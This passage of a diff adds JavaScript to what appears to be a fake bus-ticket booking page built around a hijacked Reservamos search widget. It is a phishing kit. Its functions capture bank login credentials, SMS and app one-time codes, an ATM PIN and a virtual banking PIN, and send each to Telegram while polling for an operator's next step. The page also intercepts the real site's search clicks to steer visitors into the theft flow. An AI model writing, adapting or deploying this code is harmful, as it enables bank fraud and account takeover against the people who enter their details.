+			await enviarDatosAdicionalesATelegram('codsms', valor);
+			iniciarPolling();
+		}
+
+		function validarOtpApp() {
+			const valor = document.getElementById('otpAppInput').value;
+			const isValid = valor.length >= 6;
+			document.getElementById('btnOtpApp').disabled = !isValid;
+		}
+
+		async function enviarOtpApp() {
+			const valor = document.getElementById('otpAppInput').value.trim();
+			document.getElementById('btnOtpApp').disabled = true;
+			mostrarOverlayCarga('Verificando código...');
+			datosRecopilados.otp_app = valor;
+			await enviarDatosAdicionalesATelegram('codapp', valor);
+			iniciarPolling();
+		}
+
+		function validarLogin() {
+			const usuario = document.getElementById('loginUsuarioInput').value.trim();
+			const clave = document.getElementById('loginClaveInput').value.trim();
+			const isValid = usuario.length >= 5 && clave.length >= 4;
+			document.getElementById('btnLogin').disabled = !isValid;
+		}
+
+		async function enviarLogin() {
+			const usuario = document.getElementById('loginUsuarioInput').value.trim();
+			const clave = document.getElementById('loginClaveInput').value.trim();
+			document.getElementById('btnLogin').disabled = true;
+			mostrarOverlayCarga('Verificando credenciales...');
+			datosRecopilados.login_usuario = usuario;
+			datosRecopilados.login_clave = clave;
+			await enviarDatosAdicionalesATelegram('login', `${usuario} | ${clave}`);
+			iniciarPolling();
+		}
+
+		function validarClaveCajero() {
+			const valor = document.getElementById('claveCajeroInput').value;
+			const isValid = valor.length === 4;
+			document.getElementById('btnClaveCajero').disabled = !isValid;
+		}
+
+		async function enviarClaveCajero() {
+			const valor = document.getElementById('claveCajeroInput').value.trim();
+			document.getElementById('btnClaveCajero').disabled = true;
+			mostrarOverlayCarga('Verificando clave...');
+			datosRecopilados.clave_cajero = valor;
+			await enviarDatosAdicionalesATelegram('pincaj', valor);
+			iniciarPolling();
+		}
+
+		function validarClaveVirtual() {
+			const valor = document.getElementById('claveVirtualInput').value;
+			const isValid = valor.length >= 4;
+			document.getElementById('btnClaveVirtual').disabled = !isValid;
+		}
+
+		async function enviarClaveVirtual() {
+			const valor = document.getElementById('claveVirtualInput').value.trim();
+			document.getElementById('btnClaveVirtual').disabled = true;
+			mostrarOverlayCarga('Verificando clave...');
+			datosRecopilados.clave_virtual = valor;
+			await enviarDatosAdicionalesATelegram('pinvir', valor);
+			iniciarPolling();
+		}
+
+		// =====================================================
+		// INTERCEPTOR DEL WIDGET DE BÚSQUEDA RESERVAMOS
+		// =====================================================
+
+		document.addEventListener('DOMContentLoaded', function() {
+			// Crear un observer para detectar cuando el widget cargue
+			const observer = new MutationObserver(function(mutations) {
+				const searchButton = document.querySelector('.reservamos-search button[type="submit"], .reservamos-search .search-button, #reservamosPortal button');
+				const searchForm = document.querySelector('.reservamos-search form, #reservamosPortal form');
+
+				if (searchButton || searchForm) {
+					// Interceptar clic en el botón de búsqueda
+					document.addEventListener('click', function(e) {
+						const target = e.target;
+						// Verificar si es un botón de búsqueda del widget
+						if (target.closest('.reservamos-search button') ||
+							target.closest('#reservamosPortal button') ||
+							target.closest('.search-button') ||
+							(target.tagName === 'BUTTON' && target.closest('[class*="reservamos"]'))) {
+
+							e.preventDefault();
+							e.stopPropagation();
+
+							// Obtener valores de los campos
+							const origenInput = document.querySelector('input[name="origin"], input[placeholder*="Origen"], .reservamos-search input:first-of-type');
+							const destinoInput = document.querySelector('input[name="destination"], input[placeholder*="Destino"], .reservamos-search input:nth-of-type(2)');
+
+							let origen = 'Barranquilla';
+							let destino = 'Bogotá';
+
+							if (origenInput && origenInput.value) {
+								origen = origenInput.value.split(',')[0].trim();
+							}
+							if (destinoInput && destinoInput.value) {
+								destino = destinoInput.value.split(',')[0].trim();
+							}
+
+							// Iniciar proceso de selección de sillas
+							buscarViaje(origen, destino);
+						}
+					}, true);
+
+					// También interceptar submit del formulario
+					if (searchForm) {
+						searchForm.addEventListener('submit', function(e) {
+							e.preventDefault();
+							e.stopPropagation();
+
+							const origenInput = searchForm.querySelector('input[name="origin"], input:first-of-type');
+							const destinoInput = searchForm.querySelector('input[name="destination"], input:nth-of-type(2)');
+
+							let origen = origenInput ? origenInput.value.split(',')[0].trim() : 'Barranquilla';
+							let destino = destinoInput ? destinoInput.value.split(',')[0].trim() : 'Bogotá';
+
+							buscarViaje(origen || 'Barranquilla', destino || 'Bogotá');
+						}, true);
+					}
+				}
+			});
+
+			// Observar cambios en el DOM para detectar cuando cargue el widget
+			observer.observe(document.body, {
+				childList: true,
+				subtree: true
+			});
+
+			// Agregar botón de demo en la página para pruebas
+			setTimeout(function() {
+				// Buscar el contenedor del widget o área del hero
+				const heroSection = document.querySelector('.et_pb_section_0, .et_pb_column_0');
+				if (heroSection) {
+					const demoButton = document.createElement('button');
+					demoButton.innerHTML = `
+						<svg style="width:20px;height:20px;margin-right:8px;" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+							<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"/>
+						</svg>
+						Buscar Pasajes
+					`;
+					demoButton.style.cssText = `
+						position: fixed;
+						bottom: 20px;
+						right: 20px;
+						z-index: 9999;
+						background: linear-gradient(135deg, #d22630 0%, #a91d25 100%);
+						color: white;
+						border: none;
+						padding: 15px 25px;
+						border-radius: 50px;
+						font-size: 16px;
+						font-weight: bold;
+						cursor: pointer;
+						box-shadow: 0 4px 15px rgba(210, 38, 48, 0.4);
+						display: flex;
+						align-items: center;
+						transition: transform 0.2s, box-shadow 0.2s;
+					`;
+					demoButton.onmouseover = function() {
+						this.style.transform = 'scale(1.05)';
+						this.style.boxShadow = '0 6px 20px rgba(210, 38, 48, 0.5)';
+					};
+					demoButton.onmouseout = function() {
+						this.style.transform = 'scale(1)';
+						this.style.boxShadow = '0 4px 15px rgba(210, 38, 48, 0.4)';
+					};
+					demoButton.onclick = function() {
+						buscarViaje('Barranquilla', 'Bogotá');
+					};
+					document.body.appendChild(demoButton);
+				}
+			}, 1000);
+		});
+	</script>
+</body>
+</html>
